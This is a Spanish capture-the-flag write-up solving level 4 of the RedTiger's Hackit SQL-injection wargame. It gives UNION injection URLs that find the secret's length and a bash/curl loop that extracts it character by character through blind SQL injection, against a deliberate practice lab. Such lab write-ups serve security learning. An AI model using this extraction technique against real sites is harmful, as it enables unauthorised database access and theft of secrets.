= RedTiger's Hackit 04

== Resumen

*RedTigers* es un sitio web de retos informáticos basados solamente en inyección
SQL, son 10 niveles en total que se pueden conectar con la página de
*weChall.net* para compartir los puntos ganados

== Solución

=== Escenario: pasar el nivel

*Dada* una página web con campo de contraseña

*Y* password de cookie personal: there_is_no_bug

*Cuando* intento saber el tamaño de la contraseña (cantidad de caracteres) a
través de la siguiente inyección:

[source,bash]
----
https://redtiger.labs.overthewire.org/level4.php?
id=1 union select keyword,1  from level4_secret where length(keyword)<10
----

*Cuando* estoy intentando saber si el tamaño de la contraseña es menor a 10
caracteres, si me muestra *Query returned 1 rows* es porque el tamaño de la
contraseña es mas grande, así que procedemos con 20:

[source,bash]
----
https://redtiger.labs.overthewire.org/level4.php?
id=1 union select keyword,1  from level4_secret where length(keyword)<20
----

*Y* me muestra lo mismo, entonces procedemos con 30:

[source,bash]
----
https://redtiger.labs.overthewire.org/level4.php?
id=1 union select keyword,1  from level4_secret where length(keyword)<30
----

*Y* me muestra *Query returned 2 rows*, es una pista que nos indica que el
tamaño de la contraseña está entre 20 y 30 caracteres, entonces procedemos con
"=" a ensayar entre el 20 y 30. Me doy cuenta que con 21 la página nos muestra
*Query returned 2 rows*, es decir la contraseña tiene 21 caracteres:

[source,bash]
----
https://redtiger.labs.overthewire.org/level4.php?
id=1 union select keyword,1  from level4_secret where length(keyword)=21
----

*Entonces* se procede a hacer una inyección con fuerza bruta, ya se sabe
la cantidad de caracteres que tiene la contraseña, solo debemos intentar
caracter por caracter hacer develar la contraseña, para eso se diseña el
siguiente programa en bash:

*Cuando* se crea un arreglo-Diccionario de caracteres, se llamará DICC

[source,bash]
----
DICC=('I' '+' 'a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p'
'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' ' ' '¡' '!' '-' '_' '*' '´' ',' '.' '{'
'}' '´' '+' '¡' '?' '=' ')' '(' '/' '&' '%' '$' '#' '"' ')' '!' '0' '1' '2' '3'
'4' '5' '6' '7' '8' '9' '10');
----

*Y* hacemos un doble bucle "for" en el programa, donde el primer bucle va a
iterar de 1 a 21 caracteres, y el segundo bucle va a iterar en el diccionario
*DICC*

[source,bash]
----
for i in {1..21}; do
    for x in ${DICC[@]}; do
----

*Nota:* i nos indica la posción y x el caracter

*Cuando* se utiliza curl para hacer las peticiones al servidor, con el valor de
la cookie personal, y comparando la contraseña con "substring" y el valor de x
si este valor nos da: "....2 rows", entonces mostramos este caracter como
correspondiente, salimos del bucle de DICC y pasamos a la siguiente posición,
hasta llegar a 21 caracteres encontrados

[source,bash]
----
curl --insecure -b level4login=there_is_no_bug
 "https://redtiger.labs.overthewire.org/level4.php?
id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20
SUBSTR(keyword,$i,1)='$x'" 2>/dev/null | grep "2 rows"

    rc=$?
    if [[ $rc == 0 ]] ; then
        echo -n $x
        break;
    fi

    done
done
----

*Entonces* los caracteres de la contraseña se irán mostrando poco a poco

*Y* se podrá pasar este nivel

== Link del reto

https://redtiger.labs.overthewire.org/level4.php[RedTiger's Hackit 4]
